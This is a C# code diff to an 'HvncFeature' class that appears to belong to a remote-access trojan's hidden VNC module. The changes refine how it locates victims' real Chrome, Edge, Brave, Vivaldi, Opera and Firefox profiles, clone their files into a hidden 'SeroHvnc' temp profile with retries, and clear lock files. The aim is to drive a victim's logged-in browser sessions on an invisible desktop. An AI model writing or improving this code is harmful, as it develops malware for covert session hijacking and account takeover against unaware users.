@@ -430,6 +430,10 @@ internal static class HvncFeature
 
         // Clean up Chromium singleton lock files + repair any corrupted JSON in HVNC profiles.
         CleanChromiumHvncLocks();
+        // Clean Firefox HVNC profile locks — CleanChromiumHvncLocks only handles Chromium-format locks.
+        string ffHvncProfile = Path.Combine(Path.GetTempPath(), "SeroHvnc", "firefox");
+        foreach (var lk in new[] { "parent.lock", "lock" })
+            try { File.Delete(Path.Combine(ffHvncProfile, lk)); } catch { }
 
         // Repair real Opera profile: fix wrong path bug + repair corrupted JSON files.
         if (launchedOpera || launchedOperaGX) RepairOperaProfileAfterHvnc();
@@ -1646,16 +1650,22 @@ internal static class HvncFeature
 
     private static string? GetChromiumRealProfile(string exeBase)
     {
-        string local  = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+        string local   = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
         string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+        if (exeBase.Equals("opera.exe", StringComparison.OrdinalIgnoreCase))
+        {
+            // Opera profile can be in either AppData\Roaming or AppData\Local depending on install type.
+            string roamPath  = Path.Combine(roaming, "Opera Software", "Opera Stable");
+            string localPath = Path.Combine(local,   "Opera Software", "Opera Stable");
+            return Directory.Exists(roamPath) ? roamPath : localPath;
+        }
         return exeBase.ToLowerInvariant() switch
         {
-            "chrome.exe"   => Path.Combine(local,   "Google",           "Chrome",         "User Data"),
-            "msedge.exe"   => Path.Combine(local,   "Microsoft",        "Edge",           "User Data"),
-            "brave.exe"    => Path.Combine(local,   "BraveSoftware",    "Brave-Browser",  "User Data"),
-            "vivaldi.exe"  => Path.Combine(local,   "Vivaldi",          "User Data"),
-            "chromium.exe" => Path.Combine(local,   "Chromium",         "User Data"),
-            "opera.exe"    => Path.Combine(roaming, "Opera Software",   "Opera Stable"),
+            "chrome.exe"   => Path.Combine(local, "Google",        "Chrome",        "User Data"),
+            "msedge.exe"   => Path.Combine(local, "Microsoft",     "Edge",          "User Data"),
+            "brave.exe"    => Path.Combine(local, "BraveSoftware", "Brave-Browser", "User Data"),
+            "vivaldi.exe"  => Path.Combine(local, "Vivaldi",       "User Data"),
+            "chromium.exe" => Path.Combine(local, "Chromium",      "User Data"),
             _ => null
         };
     }
@@ -1706,10 +1716,13 @@ internal static class HvncFeature
         if (pairs.Count == 0) return;
         Parallel.ForEach(pairs, _cloneParallel, static pair =>
         {
-            try { File.Copy(pair.Src, pair.Dst, overwrite: true); }
-            catch (IOException) { }
-            catch (UnauthorizedAccessException) { }
-            catch { }
+            for (int attempt = 0; attempt < 4; attempt++)
+            {
+                try { File.Copy(pair.Src, pair.Dst, overwrite: true); break; }
+                catch (IOException) { if (attempt < 3) Thread.Sleep(250); else break; }
+                catch (UnauthorizedAccessException) { break; }
+                catch { break; }
+            }
         });
     }
 
@@ -1768,10 +1781,17 @@ internal static class HvncFeature
         string iniPath = Path.Combine(ffBase, "profiles.ini");
         if (!File.Exists(iniPath)) return null;
 
-        string? bestPath    = null;
-        string? currentPath = null;
-        bool    isRelative  = true;
-        bool    isDefault   = false;
+        // Firefox 67+: [Install...] sections are the authoritative source for the active default
+        // profile. They take precedence over the Legacy Default=1 flag in [Profile...] sections,
+        // which can point to a stale profile when the user has multiple profiles.
+        string? installDefault = null;  // path from the first [Install...] Default= key found
+        string? legacyDefault  = null;  // path from [Profile...] Default=1
+        string? firstProfile   = null;  // fallback: first valid [Profile...] path seen
+
+        string? currentPath    = null;
+        bool    isRelative     = true;
+        bool    isProfileDefault = false;
+        bool    inInstallSection = false;
 
         void Commit()
         {
@@ -1779,7 +1799,9 @@ internal static class HvncFeature
             string full = isRelative
                 ? Path.Combine(ffBase, currentPath.Replace('/', Path.DirectorySeparatorChar))
                 : currentPath;
-            if (bestPath == null || isDefault) bestPath = full;
+            if (!Directory.Exists(full)) return;
+            firstProfile ??= full;
+            if (isProfileDefault) legacyDefault = full;
         }
 
         foreach (var line in File.ReadLines(iniPath))
@@ -1787,15 +1809,31 @@ internal static class HvncFeature
             string t = line.Trim();
             if (t.StartsWith('['))
             {
-                Commit(); currentPath = null; isRelative = true; isDefault = false;
+                Commit();
+                currentPath      = null;
+                isRelative       = true;
+                isProfileDefault = false;
+                inInstallSection = t.StartsWith("[Install", StringComparison.OrdinalIgnoreCase);
             }
-            else if (t.StartsWith("Path=",       StringComparison.OrdinalIgnoreCase)) currentPath = t[5..];
-            else if (t.StartsWith("IsRelative=", StringComparison.OrdinalIgnoreCase)) isRelative  = t[11..].Trim() == "1";
-            else if (t.Equals(    "Default=1",   StringComparison.OrdinalIgnoreCase)) isDefault   = true;
+            else if (inInstallSection && t.StartsWith("Default=", StringComparison.OrdinalIgnoreCase))
+            {
+                // [Install...] Default= is always a relative path like "Profiles/xxxx.default-release"
+                string rel  = t[8..].Replace('/', Path.DirectorySeparatorChar);
+                string full = Path.Combine(ffBase, rel);
+                if (installDefault == null && Directory.Exists(full))
+                    installDefault = full;
+            }
+            else if (!inInstallSection)
+            {
+                if      (t.StartsWith("Path=",       StringComparison.OrdinalIgnoreCase)) currentPath      = t[5..];
+                else if (t.StartsWith("IsRelative=", StringComparison.OrdinalIgnoreCase)) isRelative       = t[11..].Trim() == "1";
+                else if (t.Equals(    "Default=1",   StringComparison.OrdinalIgnoreCase)) isProfileDefault = true;
+            }
         }
         Commit();
 
-        return bestPath != null && Directory.Exists(bestPath) ? bestPath : null;
+        string? best = installDefault ?? legacyDefault ?? firstProfile;
+        return best != null && Directory.Exists(best) ? best : null;
     }
 
     private static void CleanFirefoxRealLocks()
